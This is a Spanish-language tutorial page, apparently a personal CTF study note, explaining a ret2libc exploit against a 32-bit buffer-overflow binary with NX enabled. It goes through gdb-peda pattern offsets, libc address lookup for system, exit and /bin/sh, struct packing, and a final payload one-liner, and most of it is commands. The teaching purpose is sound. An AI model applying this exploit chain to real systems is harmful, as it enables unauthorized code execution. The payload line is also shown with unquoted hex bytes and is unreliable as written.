---
description: >-
  Nos aprovechamos de la existencia de la librería libc en un ejecutable que sea
  vulnerable a Buffer Overflow
---

# ret2libc

## Detectamos el Buffer Overflow en el binario

Tendríamos que mandarle al input una cantidad enorme de datos para ver cómo reacciona, podemos hacerlo directamente desde "[gdb-peda](instalacion-de-gdb-peda.md)".

```
gdb

gdb-peda$ file binariovulnerable
#Podemos realizar el comando de python en otra consola 
# python -c 'print("A"*500)' para obtener un número de carácteres tan grande cómo queramos.
gdb-peda$ run binariovulnerable AAAAAAAAAAAAAAAAAAAAAA.......
```

El output que nos aparecería si hemos desbordado la pila puede ser similar a lo siguiente:

![Output de gdb-peda](<../../.gitbook/assets/image (33).png>)

Cómo podéis observar en la imagen superior aparte de haberse llenado la memoria de múltiples "A" también lo vemos en el EIP que es el puntero que apunta al siguiente lugar que se ejecutará.

Lo siguiente que debemos descubrir es en que momento podemos tener el control del EIP para ello:

```
gdb-peda$ pattern create 100
'<aquihabríaunpatrón>'
gdb-peda$ run '<aquihabríaunpatrón>'
```

![Output con el patrón de gdb-peda](<../../.gitbook/assets/image (30).png>)

Podemos observar que ahora en el EIP tenemos "AAGA" que forma parte del patrón que nos ha creado, por lo que directamente el propio gdb nos va a decir el número de caracteres existentes antes de entrar en el EIP.

```
gdb-peda$ pattern offset AAGA
AAGA found at offset: 52
```

Ya conocemos que a partir de los 52 caracteres tenemos la posibilidad de acceder al EIP, ahora tendremos que comprobar las medidas de seguridad existentes, en este caso voy a poner un ejemplo en el que se va a tener que utilizar ret2libc para aprovecharnos de este EIP para la ejecución de comandos ya que está habilitada una protección para ejecutar comandos directamente.

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Cuando vemos que el "NX" está habilitado quiere decir que no podemos ejecutar comandos directamente, pero si nos fijamos en las imágenes compartidas anteriormente se está llamando a una librería llamada libc y es de lo que nos vamos a aprovechar.

Para aprovecharnos de esto necesitamos en primer lugar saber si existe aleatorización de los espacios de memoria (en caso de que fuese así comprobaríamos si hay colisiones y lanzaríamos el exploit un numero X de veces hasta que funcione el exploit)

```
#La flag 0 es que no se aleatoriza
cat /proc/sys/kernel/randomize_va_space
```

Y a continuación necesitamos el espacio de memoria de:

```
# Libc
ldd rop

# System y Exit
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i -E ' system@@| exit@@'

# /bin/sh
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

Esto nos proporciona tres direcciones de memoria en hexadecimal y debemos hacer lo siguiente (por ejemplo podemos sumarlo con gdb-peda):

```
gdb-peda$ p <libcdir> + <systemdir>
gdb-peda$ p <libcdir> + <exitdir>
gdb-peda$ p <libcdir> + <bin/shdir>
#Ejemplo 0xb7e19000 + 0x0003ada0
```

Lo siguiente sería pasar a little endian, ya sea a través de python o manualmente pongo un ejemplo a través de python:

```python
import struct
system = struct.pack('<I', 0xb7e53da0)
```

Y por último mandar dicha cadena a nuestro binario (puede ser a través de un script o de forma manual)

```
#Ejemplo
./binario $(python -c 'print("A"*52 + \xa0\x3d\xe5\xb7 + \xd0\x79\xe4\xb7 + \x0b\x4a\xf7\xb7)')
```

## Practicar

* Máquina "Frolic" HTB \[Acceso 17/02/2022]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
